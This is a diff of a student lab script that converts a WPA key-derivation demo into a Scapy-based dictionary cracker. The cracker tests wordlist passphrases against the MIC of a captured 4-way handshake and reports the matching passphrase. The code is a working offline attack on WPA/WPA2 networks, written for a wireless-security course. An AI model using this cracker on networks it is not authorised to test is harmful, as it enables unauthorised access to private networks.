@@ -2,16 +2,14 @@
 # -*- coding: utf-8 -*-
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
+Aircrack basé sur Scapy
 
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
+
 
 Modified : Julien Béguin & Gwendoline Dössegger
 """
 
-__author__ = "Abraham Rubinstein et Yann Lederrey"
+__author__ = "Julien Béguin & Gwendoline Dössegger"
 __copyright__ = "Copyright 2017, HEIG-VD"
 __license__ = "GPL"
 __version__ = "1.0"
@@ -20,7 +18,7 @@ __status__ = "Prototype"
 
 import hashlib
 import hmac
-from binascii import a2b_hex, b2a_hex
+from binascii import a2b_hex
 
 from pbkdf2 import *
 from scapy.all import *
@@ -63,14 +61,12 @@ def main():
             Clientmac = a2b_hex(trame.addr2.replace(':', ''))
             break
 
-
     # Get the ANonce based on the MAC address
     for trame in wpa:
         if trame.subtype == 0x0 \
                 and trame.type == 0x2 \
                 and a2b_hex(trame.addr2.replace(':', '')) == APmac \
                 and a2b_hex(trame.addr1.replace(':', '')) == Clientmac:
-
             ANonce = trame.getlayer(WPA_key).nonce
             break
 
@@ -99,53 +95,44 @@ def main():
             # Get the value of the key Information MD5 (1) or SHA1 (2)
             crypto = raw(trame)[0x36] & 0x2
 
-
     # ---------------------------------------------------------------
-    # Important parameters for key derivation - most of them can be obtained from the pcap file
-    passPhrase = "actuelle"
-    A = "Pairwise key expansion"  # this string is used in the pseudo-random function
-    B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)  # used in pseudo-random function
-    data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")  # cf "Quelques détails importants" dans la donnée
 
-    # This is the MIC contained in the 4th frame of the 4-way handshake
-    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-    # mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
+    # Get a list of passPhrase from the wordlist
+    wordlist = open("wordlist.txt", "r")
+    passPhrases = [x.strip() for x in wordlist.readlines()]
+    wordlist.close()
 
-    print("\n\nValues used to derivate keys")
-    print("============================")
-    print("Passphrase: ", passPhrase, "\n")
-    print("SSID: ", ssid, "\n")
-    print("AP Mac: ", b2a_hex(APmac), "\n")
-    print("CLient Mac: ", b2a_hex(Clientmac), "\n")
-    print("AP Nonce: ", b2a_hex(ANonce), "\n")
-    print("Client Nonce: ", b2a_hex(SNonce), "\n")
-
-    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-    passPhrase = str.encode(passPhrase)
     ssid = str.encode(ssid)
 
-    # MD5 = 0x01 & SHA1 = 0x02
-    if crypto == 0x01:
-        pmk = pbkdf2(hashlib.md5, passPhrase, ssid, 4096, 32)
-    else:
-        pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
+    # Test chaque passPhrase
+    for passPhrase in passPhrases:
+        print("[+] Testing passphrase:", passPhrase)
 
-    # expand pmk to obtain PTK
-    ptk = customPRF512(pmk, str.encode(A), B)
+        # Important parameters for key derivation - most of them can be obtained from the pcap file
+        A = "Pairwise key expansion"  # this string is used in the pseudo-random function
+        B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
+                                                                                      SNonce)  # used in pseudo-random function
+        data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")  # cf "Quelques détails importants" dans la donnée
 
-    # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-    mic = hmac.new(ptk[0:16], data, hashlib.sha1)
+        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+        passPhrase = str.encode(passPhrase)
 
-    if mic_to_test == mic.hexdigest()[:32]:
-        print("\nResults of the key expansion")
-        print("=============================")
-        print("PMK:\t\t", pmk.hex(), "\n")
-        print("PTK:\t\t", ptk.hex(), "\n")
-        print("KCK:\t\t", ptk[0:16].hex(), "\n")
-        print("KEK:\t\t", ptk[16:32].hex(), "\n")
-        print("TK:\t\t", ptk[32:48].hex(), "\n")
-        print("MICK:\t\t", ptk[48:64].hex(), "\n")
-        print("MIC:\t\t", mic.hexdigest(), "\n")
+        # MD5 = 0x01 & SHA1 = 0x02
+        if crypto == 0x01:
+            pmk = pbkdf2(hashlib.md5, passPhrase, ssid, 4096, 32)
+        else:
+            pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
+
+        # expand pmk to obtain PTK
+        ptk = customPRF512(pmk, str.encode(A), B)
+
+        # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+        mic = hmac.new(ptk[0:16], data, hashlib.sha1)
+
+        # Test if the current passphrase is valid
+        if mic_to_test == mic.hexdigest()[:32]:
+            print("[#] You win ! The passphrase is : " + passPhrase.decode())
+            break
 
 
 if __name__ == '__main__':
